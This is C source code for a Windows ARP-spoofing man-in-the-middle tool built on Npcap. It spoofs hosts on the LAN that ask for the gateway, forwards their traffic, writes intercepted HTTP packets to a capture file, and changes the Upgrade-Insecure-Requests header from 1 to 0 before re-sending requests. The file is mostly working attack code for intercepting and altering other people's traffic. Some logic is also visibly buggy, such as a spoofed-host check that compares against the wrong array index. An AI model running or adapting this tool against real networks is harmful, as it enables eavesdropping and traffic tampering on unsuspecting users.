#include "pcap.h"
#include "ntddndis.h"
#include "iphlpapi.h"
#include "tchar.h"
#include "packet.h"
#include "spoof.h"
#include "globals.h"

// System Specific
BOOL LoadNpcapDlls()
{
    _TCHAR npcap_dir[512];
    UINT len;
    len = GetSystemDirectory(npcap_dir, 480);
    if (!len)
    {
        fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
        return FALSE;
    }
    _tcscat_s(npcap_dir, 512, _T("\\Npcap"));
    if (SetDllDirectory(npcap_dir) == 0)
    {
        fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// Statics

BOOL enableAutoSpoof = FALSE;

// Logics

void init_addrs();
void manual_setup_spoof(uint32_t targetIp);
void enable_auto_spoof(BOOL value) { enableAutoSpoof = value; }
void ethernet_protocol_callback(unsigned char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);

pcap_t *mainDevice;
int main(int argc, char **argv)
{
    char errbuf[PCAP_BUF_SIZE];

    if (!LoadNpcapDlls())
    {
        printf("Failed to load Npcap!");
        exit(1);
    }

    init_addrs();

    mainDevice = pcap_open(DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (mainDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }
    pcap_dumper_t *dumpDevice = pcap_dump_open(mainDevice, "dump.pcap");

    LOG("Capture started");
    if (pcap_loop(mainDevice, -1, ethernet_protocol_callback, (u_char *)dumpDevice))
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }

    pcap_close(mainDevice);
}

void init_addrs()
{
    PIP_ADAPTER_INFO pAdapterInfo;

    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL)
    {
        LOG("Error allocating memory needed to call GetAdaptersinfo\n");
        exit(1);
    }
    // Make an initial call to GetAdaptersInfo to get
    // the necessary size into the ulOutBufLen variable
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            LOG("Error allocating memory needed to call GetAdaptersinfo\n");
            exit(1);
        }
    }

    DWORD dwRetVal;
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
    {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter)
        {
            if (strstr(DEVICE_NAME, pAdapter->AdapterName) != NULL)
            {
                ipAddr = inet_addr(pAdapter->IpAddressList.IpAddress.String);
                gateAddr = inet_addr(pAdapter->GatewayList.IpAddress.String);
                for (int i = 0; i < pAdapter->AddressLength; i++)
                {
                    localMacAddr[i] = pAdapter->Address[i];
                }
                ULONG size = 6;
                SendARP(gateAddr, ipAddr, gateMacAddr, &size);

                if (size != 6)
                {
                    LOG("Failed to obtain Mac Addresses!")
                    exit(1);
                }
                LOG("Mac Addresses:\nLocal:%.2x%.2x%.2x%.2x%.2x%.2x\nGate:%.2x%.2x%.2x%.2x%.2x%.2x",
                    localMacAddr[0], localMacAddr[1], localMacAddr[2], localMacAddr[3], localMacAddr[4], localMacAddr[5],
                    gateMacAddr[0], gateMacAddr[1], gateMacAddr[2], gateMacAddr[3], gateMacAddr[4], gateMacAddr[5])
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    else
    {
        LOG("GetAdaptersInfo failed with error: %d\n", dwRetVal);
        exit(1);
    }

    if (pAdapterInfo)
        free(pAdapterInfo);
}

void handleHttp(TcpPacket *tcpPacket, uint16_t len)
{
    if (!len)
        return;
    uint8_t *payload = tcpPacket->payload;
    char *pos = NULL;
    if (pos = strstr(payload, "Upgrade-Insecure-Requests"))
    {
        uint8_t *lineEnd = (uint8_t *)strstr(pos, "\r\n"); // It should always be
        if (*(lineEnd - 1) == '1')                         // found
        {
            TcpPacket *newPacket = malloc(sizeof(TcpPacket) + len);
            memcpy(newPacket, tcpPacket, sizeof(TcpPacket));
            memcpy(newPacket->payload, payload, len);
            memcpy(newPacket->ether.ether_dhost, gateMacAddr, 6);
            *(newPacket->payload + (lineEnd - payload) - 1) = '0';
            newPacket->tcp.checksum = TcpChecksum(newPacket);
            pcap_sendpacket(mainDevice, (const uint8_t *)newPacket, sizeof(TcpPacket) + len);
            free(newPacket);
        }
    }
    return;
}

bool isMacSpoofed(const uint8_t *mac)
{
    for (int i = 0; i < spoofedTop; i++)
    {
        if (memcmp(mac, spoofedMachines[spoofedTop].MacAddress, 6) == 0)
        {
            return true;
        }
    }
    return false;
}

void ethernet_protocol_callback(unsigned char *argument, const struct pcap_pkthdr *packet_header, const unsigned char *packet_content)
{
    u_char *dumpDevice = argument;
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;
    if (!memcmp(ethPacket->header.ether_shost, localMacAddr, MACADDR_LEN)) // Packet sent by us
    {
        // ignore it
        return;
    }

    uint32_t arp = ntohs(0x0806);
    uint32_t ipv4 = ntohs(0x0800);
    if (ethPacket->header.ether_type == arp) // arp
    {
        ArpPacket *arpPacket = (ArpPacket *)ethPacket;
        if (enableAutoSpoof && arpPacket->arp.ar_op == 1 && memcmp(&arpPacket->arp.ar_sha, localMacAddr, 6)) // request
        {
            if (arpPacket->arp.ar_tip == gateAddr)
            // We got an newbie, spoof it
            {
                CreateSpoofThread(arpPacket->arp.ar_sha, arpPacket->arp.ar_sip);
                return;
            }
        }
    }
    else if (ethPacket->header.ether_type == ipv4) // IPv4
    {
        Ipv4Packet *ipv4Packet = (Ipv4Packet *)ethPacket;
        if (ipv4Packet->ipv4.proto == 6) // TCP
        {
            TcpPacket *tcpPacket = (TcpPacket *)ethPacket;
            uint16_t sourcePort = ntohs(tcpPacket->tcp.src_port);
            uint16_t destPort = ntohs(tcpPacket->tcp.dst_port);
            if (sourcePort == 80 || destPort == 80) // HTTP
            {
                pcap_dump(dumpDevice, packet_header, packet_content);
                uint16_t len = ntohs(ipv4Packet->ipv4.len) - sizeof(ipv4Packet->ipv4) - (tcpPacket->tcp.data_off_set >> 4 << 2);
                uint16_t checksum = TcpChecksum(tcpPacket);
                uint16_t ipchecksum = Ipv4Checksum(ipv4Packet);
                handleHttp(tcpPacket, len);
                return;
            }
            if (sourcePort == 443 || destPort == 443) // HTTPS
            {
            }
        }
    }
    if (isMacSpoofed(ethPacket->header.ether_shost))
    {
        uint8_t *pkt = malloc(packet_header->len);
        memcpy(pkt, packet_content, packet_header->len);
        pcap_sendpacket(mainDevice, pkt, packet_header->len);
        free(pkt);
    }
}

void manual_setup_spoof(uint32_t targetIp)
{
    ULONG size = 6;
    char targetMac[6];
    SendARP(targetIp, ipAddr, targetMac, &size);

    if (size != 6)
    {
        struct in_addr addr;
        addr.s_addr = targetIp;
        LOG("Failed to obtain Mac Addresses for target ip %s", inet_ntoa(addr))
        return;
    }

    CreateSpoofThread(targetMac, targetIp);
}